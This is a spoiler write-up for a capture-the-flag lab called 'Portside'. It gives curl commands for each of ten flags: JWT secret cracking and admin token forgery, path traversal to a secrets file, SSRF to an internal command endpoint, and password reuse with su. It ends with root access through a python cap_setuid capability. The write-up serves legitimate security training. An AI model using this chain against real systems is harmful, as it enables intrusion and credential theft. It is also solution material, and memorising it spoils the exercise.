# Writeup — Portside (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. `curl http://TARGET:8003/docs` → HTML comment.
2. `curl http://TARGET:8003/manifest/abc` → Werkzeug debugger traceback,
   shows the source line `numeric_id = int(manifest_id)  # flag2: ...`.
3. `curl http://TARGET:8003/guest-token` → `{"token": "..."}`. Decode the
   payload (middle segment) as base64url JSON, or use
   `jwt.decode(token, options={"verify_signature": False})` → flag 3.
4. The JWT signing secret is `letmein` (crack it with `jwt_tool -C -d
   rockyou.txt -t http://TARGET:8003/guest-token` or hashcat mode 16500
   against the guest token, rather than assuming it). Forge an admin
   token: `jwt.encode({"role": "admin"}, "letmein", algorithm="HS256")`,
   then `curl -H "Authorization: Bearer <token>"
   http://TARGET:8003/admin/dashboard` → flag 4, plus a link to the pcap.
5. `curl "http://TARGET:8003/reports?file=../config/secrets.txt"` → flag 5
   and `INTERNAL_API_TOKEN=diag-9f3a-internal`.
6. `curl --get --data-urlencode "url=http://127.0.0.1:5001/status"
   http://TARGET:8003/preview` → flag 6. (Port 5001 is never published —
   this only works because the fetch happens server-side.)
7. `curl --get --data-urlencode
   "url=http://127.0.0.1:5001/run?cmd=cat+/opt/portside/flag7.txt&token=diag-9f3a-internal"
   http://TARGET:8003/preview` → flag 7. (The URL you pass to `url=` has
   its own query string, which needs careful encoding — this is the
   "chain" step: SSRF to reach the service, the leaked token from flag 5
   to use its command endpoint.)
8. `curl -H "Authorization: Bearer <admin JWT>"
   http://TARGET:8003/incident-capture.pcap -o capture.pcap`, then open
   in Wireshark (Follow → HTTP Stream) or
   `tshark -r capture.pcap -Y http -T fields -e http.file_data` → flag 8,
   and `dockworker_password=...` in the same request body.
9. Reuse that password through the same RCE chain:
   `cmd=echo+<password>+|+su+dockworker+-c+'cat+/home/dockworker/flag9.txt'`
   via the same `/preview?url=http://127.0.0.1:5001/run?...` pattern as
   step 7 → flag 9.
10. Through the same RCE, `getcap -r / 2>/dev/null` shows
    `/usr/bin/python3.11 cap_setuid=ep`. Abuse it:
    `cmd=python3+-c+"import os;os.setuid(0);print(open('/root/flag10.txt').read())"`
    → flag 10.

## Honeypots encountered (intentional, cost time only)
- `/reports?file=old_credentials.txt` — explicitly inert decoy creds.
- SSRF to `http://127.0.0.1:5001/legacy` — a real, responding endpoint
  with nothing useful behind it.
